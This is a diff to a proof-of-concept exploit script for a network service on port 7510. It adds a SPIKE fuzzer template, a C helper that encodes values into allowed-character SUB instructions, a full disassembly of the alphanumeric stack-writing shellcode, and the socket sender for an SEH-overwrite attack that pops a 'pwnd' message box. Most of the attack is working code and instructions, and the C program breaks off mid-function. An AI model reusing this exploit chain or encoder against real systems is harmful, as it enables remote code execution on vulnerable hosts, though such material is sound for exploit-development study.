@@ -6,6 +6,24 @@
 #The pop-pop-ret places the EIP four bytes before the overwrite, where I place a JNO instruction to place EIP at 1035fe3d,
 #just after the overwrite. 
 
+#The spike fuzzer template used was:
+#s_string_variable(“GET”);
+#s_string(“ “);
+#s_string_variable(“/topology/home”);
+#s_string(“ “);
+#s_string(“HTTP/1.1”);
+#s_string(“\r\n”);
+#s_string(“Host: “);
+#s_string_variable(“192.168.1.100”);
+#s_string(“:”);
+#s_string_variable(“7510”);
+#s_string(“\r\n”);
+#s_string_variable(“User-Agent”);
+#s_string(“: “);
+#s_string_variable(“Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.14)”);
+#s_string(“\r\n\r\n”);
+
+
 #The shellcode for message box requires parameters to be in a certain order on the stack, before making the system call.  
 #The assembly instructions for this shellcode is shown below:
 
@@ -31,6 +49,171 @@
 #it writes the instructions.  The instructions to write the shellcode need to be within a list of allowed 
 #characters that the application will not mangle.
 
+#The following C program(not written by me) was used to quickly obtain the correct instructions that calculate the desired 
+#shellcode, while sticking to allowed characters.  It takes two, four byte parameters as inputs, and outputs 
+#the correct SUB instructions to get from first parameter to the second parameter.  The parameters can be 
+#thought of as memory addresses.  When placing these instructions onto the buffer, care must be taken to 
+#place the bytes in the correct order due to endianness.  
+#include <stdio.h>
+#include <sys/stat.h>
+#include <ctype.h>
+#include <time.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define CHR "\x41\x42\x43\x45\x46\x47\x49\x4b\x4c\x4d\x4e\x4f\x50\x52\x53\x54\x55\x56\x57\x59\x5a\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a"
+
+int main(int argc, char* argv[])
+{
+    int bufsize = sizeof(CHR);
+    printf("[+] Length of allowed Chars: %d bytes\n",bufsize);
+    printf("[+]Encoding for this character set:\n");
+    printf("01-02-03-04-05-06-07-08-09-0b-0c-0e-0f-10-11-12-13-14-15-16-17-18-19-1a-1b-1c-1d-1e-1f-20-21-22-23-24-25-26-27-28-29-2a-2b-2c-2d-2e-30-31-32-33-34-35-36-37-38-39-3b-3c-3d-3e-41-42-43-44-45-46-47-48-49-4a-4b-4c-4d-4e-4f-50-51-52-53-54-55-56-57-58-59-5a-5b-5c-5d-5e-5f-60-61-62-63-64-65-66-67-68-69-6a-6b-6c-6d-6e-6f-70-71-72-73-74-75-76-77-78-79-7a-7b-7c-7d-7e-7f\n\n");
+    printf("[+] Allocating Memory...");
+    unsigned int targ, last, t[4], l[4];
+    unsigned int shot, single, carry = 0;
+    int len, a, i, j, k, m, z, flag = 0;
+    char word[3][4];
+    unsigned char mem[bufsize + 3];
+    if (argc < 2) {
+        printf("[!] Usage: %s <EAX starting value> <EAX end value>\n", argv[0]);
+        exit(1);
+    }
+    srand(time(NULL));
+    memset(mem,0,bufsize+3);
+    strcpy(mem, CHR);
+    len = strlen(mem);
+    strfry(mem); // Randomize
+    last = strtoul(argv[1], NULL, 0);
+    targ = strtoul(argv[2], NULL, 0);
+    printf("[+] Calculating printable values to subtract from EAX..\n\n");
+    t[3] = (targ & 0xff000000) >> 24; // Splitting by bytes
+    t[2] = (targ & 0x00ff0000) >> 16;
+    t[1] = (targ & 0x0000ff00) >> 8;
+    t[0] = (targ & 0x000000ff);
+    l[3] = (last & 0xff000000) >> 24;
+    l[2] = (last & 0x00ff0000) >> 16;
+    l[1] = (last & 0x0000ff00) >> 8;
+    l[0] = (last & 0x000000ff);
+    for (a = 1; a < 5; a++)
+    { // Value count
+        carry = flag = 0;
+        for (z = 0; z < 4; z++)
+        { // Byte count
+            for (i = 0; i < len; i++)
+            {
+                for (j = 0; j < len; j++)
+                {
+                    for (k = 0; k < len; k++)
+                    {
+                        for (m = 0; m < len; m++)
+                        {
+                            if (a < 2) j = len + 1;
+                            if (a < 3) k = len + 1;
+                            if (a < 4) m = len + 1;
+                            shot = t[z] + carry + mem[i] + mem[j] + mem[k] + mem[m];
+                            single = (shot & 0x000000ff);
+                            if (single == l[z])
+                            {
+                                carry = (shot & 0x0000ff00) >> 8;
+                                if (i < len) word[0][z] = mem[i];
+                                if (j < len) word[1][z] = mem[j];
+                                if (k < len) word[2][z] = mem[k];
+                                if (m < len) word[3][z] = mem[m];
+                                i = j = k = m = len + 2;
+                                flag++;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        if (flag == 4) { // If all 4 bytes found
+            printf("[*] Encoded!\nStart: 0x%08x\n\n", last);
+            for (i = 0; i < a; i++)
+                printf("     - 0x%08x\n", *((unsigned int *)word[i]));
+            printf("-------------------\n");
+            
+#The EAX register is used to perform the calculations.  The first step is to set ESP to the position where 
+#the message box shellcode will be placed.  The current value of the ESP is placed in EAX with a PUSH ESP and a POP EAX.  
+#This value was 1034e1e8, and after the SUB commands, the value is 1035ff34.  This value is placed in ESP with a PUSH EAX 
+#and a POP ESP.  
+
+#The next step is to place the message box shellcode onto the stack.  This shellcode is broken up into four byte sections, 
+#and placed backwards onto the stack.  The last section is pushed onto the stack first, as ESP decreases numerically with 
+#each PUSH.  
+
+#The EAX register is zeroed out with PUSH EDI (EDI is 0) and a POP EAX.  The corresponding SUBs are made 
+#to transform EAX into the piece of the message shellcode that is needed.  The message shellcode is then PUSHed onto 
+#the stack.  This process is repeated until the complete message shellcode is on the stack.  After EIP runs through this 
+#process, it will run into the message shellcode that will lead to the execution of the message box with the word ‘pwnd’.
+
+#The complete instructions are below.
+
+#1035FE3E   54               PUSH ESP
+#1035FE3F   58               POP EAX
+#1035FE40   2D 4D4D4D4D      SUB EAX,4D4D4D4D
+#1035FE45   2D 4D4D4D4D      SUB EAX,4D4D4D4D
+#1035FE4A   2D 6A476465      SUB EAX,6564476A
+#1035FE4F   50               PUSH EAX
+#1035FE50   5C               POP ESP
+#1035FE51   57               PUSH EDI
+#1035FE52   58               POP EAX
+#1035FE53   2D 32323232      SUB EAX,32323232
+#1035FE58   2D 324D7575      SUB EAX,75754D32
+#1035FE5D   2D 61095971      SUB EAX,71590961
+#1035FE62   50               PUSH EAX
+#1035FE63   57               PUSH EDI
+#1035FE64   58               POP EAX
+#1035FE65   2D 5B5B5B5B      SUB EAX,5B5B5B5B
+#1035FE6A   2D 52775B5B      SUB EAX,5B5B7752
+#1035FE6F   2D 036F6A70      SUB EAX,706A6F03
+#1035FE74   50               PUSH EAX
+#1035FE75   57               PUSH EDI
+#1035FE76   58               POP EAX
+#1035FE77   2D 3C70703C      SUB EAX,3C70703C
+#1035FE7C   2D 743C3E73      SUB EAX,733E3C74
+#1035FE81   50               PUSH EAX
+#1035FE82   57               PUSH EDI
+#1035FE83   58               POP EAX
+#1035FE84   2D 6E026339      SUB EAX,3963026E
+#1035FE89   2D 07316906      SUB EAX,6693107
+#1035FE8E   50               PUSH EAX
+#1035FE8F   57               PUSH EDI
+#1035FE90   58               POP EAX
+#1035FE91   2D 3D450502      SUB EAX,205453D
+#1035FE96   2D 55566F31      SUB EAX,316F5655
+#1035FE9B   50               PUSH EAX
+#1035FE9C   57               PUSH EDI
+#1035FE9D   58               POP EAX
+#1035FE9E   2D 6F454545      SUB EAX,4545456F
+#1035FEA3   2D 4550453C      SUB EAX,3C455045
+#1035FEA8   2D 4C020507      SUB EAX,705024C
+#1035FEAD   50               PUSH EAX
+#1035FEAE   57               PUSH EDI
+#1035FEAF   58               POP EAX
+#1035FEB0   2D 42696969      SUB EAX,69696942
+#1035FEB5   2D 56767676      SUB EAX,76767656
+#1035FEBA   50               PUSH EAX
+#1035FEBB   57               PUSH EDI
+#1035FEBC   58               POP EAX
+#1035FEBD   2D 3B656565      SUB EAX,6565653B
+#1035FEC2   2D 05050665      SUB EAX,65060505
+#1035FEC7   2D 52310959      SUB EAX,59093152
+#1035FECC   50               PUSH EAX
+#1035FECD   57               PUSH EDI
+#1035FECE   58               POP EAX
+#1035FECF   2D 34343434      SUB EAX,34343434
+#1035FED4   2D 76310606      SUB EAX,6063176
+#1035FED9   2D 5632554E      SUB EAX,4E553256
+#1035FEDE   50               PUSH EAX
+#1035FEDF   57               PUSH EDI
+#1035FEE0   58               POP EAX
+#1035FEE1   2D 66787878      SUB EAX,78787866
+#1035FEE6   2D 32676767      SUB EAX,67676732
+#1035FEEB   50               PUSH EAX 
+
+#The instructions can then be placed in a python script to send to the application
 
 #!/usr/bin/python
 import socket
@@ -48,3 +231,13 @@ expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
 expl.connect(("192.168.27.240", 7510))
 expl.send(buffer)
 expl.close()
+
+
+#The overall flow of the exploit is as follows:
+#Send the buffer to the application
+#The buffer overwrites SEH with a POP-POP-RET address
+#The POP-POP-RET goes to a position that is four bytes before the SEH overwrite
+#This position contains an instruction to jump just past the overwrite
+#EIP then encounters the instructions to write the message box shellcode onto the stack
+#After writing the message box shellcode, EIP encounters the message box shellcode
+#Message box appears
